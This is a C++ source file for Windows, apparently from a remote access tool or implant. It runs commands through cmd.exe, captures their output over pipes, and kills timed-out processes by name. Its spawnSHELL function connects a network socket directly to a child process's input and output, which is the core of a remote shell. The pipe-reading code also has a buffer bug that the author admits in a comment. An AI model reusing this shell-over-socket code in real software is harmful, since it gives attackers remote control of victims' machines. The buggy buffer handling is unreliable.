#define _WIN32_WINNT  0x0600 //https://stackoverflow.com/questions/15111799/what-is-win32-winnt-and-how-does-it-work
//#define WIN32_LEAN_AND_MEAN

#include "../inc/Exec.h"
#include "../inc/common.h"
#include "../inc/other.h"
using namespace std;

Exec::Exec()
{
    ;
}

vector<DWORD> Exec::returnPid(wstring stringTargetProcessName)
{
    wstring targetProcessName = stringTargetProcessName;
    wcout << targetProcessName  << endl;
    vector<DWORD> pids; //stock all pid in vector.
    DWORD my_pid = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes

    PROCESSENTRY32W entry; 
    entry.dwSize = sizeof entry;

    if (!Process32FirstW(snap, &entry)) 
    { //start with the first in snapshot
        //wcout << "ERROR" << endl;
        return pids;
    }

    do 
    {
       // wcout << entry.szExeFile << endl;
        if (wstring(entry.szExeFile) == targetProcessName) 
        {
            if(my_pid != entry.th32ProcessID)
            {
                //test
                pids.push_back(entry.th32ProcessID); //name matches; add to list
            }
            else
            {
                //wcout << "My pid is find ! : " << my_pid << " : "<<  entry.th32ProcessID<< endl;
                ;
            }
        }
    } while (Process32NextW(snap, &entry)); //keep going until end of snapshot

    return pids;
}


VOID Exec::setupAllPipe()
{
    
    // Réglez le drapeau bInheritHandle pour que les poignées de pipe soient héritées. 
    security.nLength = sizeof(SECURITY_ATTRIBUTES); 
    security.bInheritHandle = TRUE; 
    security.lpSecurityDescriptor = NULL; 
    
    // Créer un tuyau pour le STDERR du processus enfant.  | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
    // cout << "GO PIPE " << endl;
    if(!CreatePipe(&a_hChildStd_ERR_Rd, &a_hChildStd_ERR_Wr, &security, 0)) 
    {
        a_error = TRUE;
    //    exit(1); 
    }
     // Veiller à ce que la poignée de lecture du tuyau pour le STDERR ne soit pas héritée.
    if(!SetHandleInformation(a_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        a_error = TRUE;
       // exit(1);
    }
     // Créer un tuyau pour le processus de l'enfant STDOUT. | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
    if(!CreatePipe(&a_hChildStd_OUT_Rd, &a_hChildStd_OUT_Wr, &security, 0) ) 
    {
        //cout <<" NO CREATE PIPE" << endl;
        a_error = TRUE;
        //exit(1);
    }
      // S'assurer que la poignée de lecture du tuyau pour STDOUT n'est pas héritée
    if(!SetHandleInformation(a_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        a_error = TRUE;
        //exit(1); 
    }
    // Créer le processus de l'enfant.  

    // Les poignées ouvertes restantes sont nettoyées à la fin de ce processus. 
    // Pour éviter les fuites de ressources dans une application plus importante, 
    // fermer les poignées explicitement.
}

PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
{
    wstring command_C = L"/C " + command;
    WCHAR *argv_cmd = &command_C[0]; //arguments
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFOW siStartInfo;
    BOOL bSuccess = FALSE; 

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION)); 
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
    
    siStartInfo.cb = sizeof(STARTUPINFOW); 
    siStartInfo.hStdError = a_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = a_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES; //Les membres hStdInput , hStdOutput et hStdError contiennent des informations supplémentaires. Si cet indicateur est spécifié lors de l'appel de l'une des fonctions de création de processus, les handles doivent être héritables et le paramètre bInheritHandles de la fonction doit être défini sur TRUE. Pour plus d'informations, consultez Gérer l'héritage .


    bSuccess = CreateProcessW(L"C:\\windows\\system32\\cmd.exe",  //command line 
        argv_cmd,     // argv of cmd
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION
    
    BOOL statusObject = WaitForSingleObject(piProcInfo.hProcess, TIMEOUT_CREATE_PROC);

    if(statusObject == WAIT_TIMEOUT)
    {
        //if timeout
        a_timeout = TRUE;
    }

    CloseHandle(a_hChildStd_ERR_Wr);
    CloseHandle(a_hChildStd_OUT_Wr);
    
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    // If an error occurs, exit the application. 
    if (!bSuccess)
    {
        a_error = TRUE;
        //exit(1);
    }
    return piProcInfo;
}

vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
{
    INT index=0;

    DWORD dwRead; 
    CHAR chBuff[4096];

    wstring out,err;
    vector<string> result;

    while(true) //Read buffer of anonymous pipe and append the result in result_of_command
    {
        if(!ReadFile(a_hChildStd_OUT_Rd, &chBuff, BUFFER_EXEC ,&dwRead,NULL))
        {
            //cout << " readFromPipe Error in read pipe childen out" << endl;
            break;
        }
        /*
        IF I don't display the chBuf, the size of the buffer and from 10 to 50 .
        This makes my program crash because if there is a lot of data in the result of the command, it is very problematic.

        But if I display the chBuf the buffer size is 4096.
        I don't understand where the problem comes from. 
        */
        
        string s  = chBuff;
        
        wcout << strlen(chBuff) << endl;

        result.push_back(s);
        s.erase();

        ZeroMemory(&chBuff,  strlen(chBuff));
    }
   
    ZeroMemory(&chBuff, strlen(chBuff));
    

    while(TRUE)
    {
        if(!ReadFile(a_hChildStd_ERR_Rd, chBuff, BUFFER_EXEC,&dwRead,NULL))
        {
            //cout << "stderr: Error in read pipe childen out " << endl;
            break;
        }

        string s =  chBuff;
        
        wcout << strlen(chBuff) << endl;
        
        result.push_back(s);
        s.erase();

        ZeroMemory(&chBuff, strlen(chBuff));
    } 
    return result;
}


vector<string> Exec::executeCommand(wstring command)
{
    vector<string> result_of_command;

    setupAllPipe();
    PROCESS_INFORMATION piProcInfo = createChildProcess(command);
    
    if(a_error)
    {
        result_of_command.push_back("[-] FATAL ERROR.");
        return result_of_command;
    }
    else
    {
        if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
        {
            result_of_command.push_back("The command was executed successfully but no data was returned.");
            result_of_command = readFromPipe(piProcInfo);//TO delete
            //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
        }
        else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
        {
            //test if the process is stuck:
            vector<DWORD> pids = returnPid((command.substr(0, command.find(L" ")))+L".exe"); //list all pid
            
            if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
            {
                for(INT i=0;i <pids.size(); i++)
                {
                    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[i]);
                    TerminateProcess(proc, 1);
                    CloseHandle(proc);
                    
                    //cout << "[+] Process: " << pids[i] << " killed" << endl;
                }
                result_of_command.push_back("[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (ConvertWideToUtf8(command) + ".exe") + "we were well and truly killed.");
            }
            else
            {
                //result_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
               // cout << "No process was killed" << endl;
                result_of_command = readFromPipe(piProcInfo);
            }
        }
        else
        {result_of_command = readFromPipe(piProcInfo);}

        //Finally return result_of_command
        return result_of_command; 
    }
}


VOID Exec::spawnSHELL(SOCKET &sock, WCHAR *prog) //Change to WCHAR
{

    STARTUPINFOW siStartInfo;
    PROCESS_INFORMATION piProcInfo;
    
    ZeroMemory(&siStartInfo, sizeof(siStartInfo)); //Remplit un bloc de mémoire avec des zéros.
    ZeroMemory(&piProcInfo, sizeof(piProcInfo));

    siStartInfo.cb = sizeof(siStartInfo);

    siStartInfo.dwFlags = STARTF_USESTDHANDLES; //| STARTF_USESHOWWINDOW) ; //for hStdInput, hStdOutput, hStdError

    siStartInfo.hStdInput = (HANDLE)sock;
    siStartInfo.hStdOutput = (HANDLE)sock;
    siStartInfo.hStdError = (HANDLE)sock;

    CreateProcessW(NULL,  //command line 
        prog,     // argv of cmd
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags  CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION

    WaitForSingleObject(piProcInfo.hProcess, INFINITE);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
}


Exec::~Exec()
{
    CloseHandle(a_hChildStd_OUT_Rd);
    CloseHandle(a_hChildStd_ERR_Rd);
}


//https://stackoverflow.com/questions/15694445/using-readfile-function-to-read-binary-data-in-windows
//https://stackoverflow.com/questions/28197891/win32-readfile-output-without-waiting-for-buffer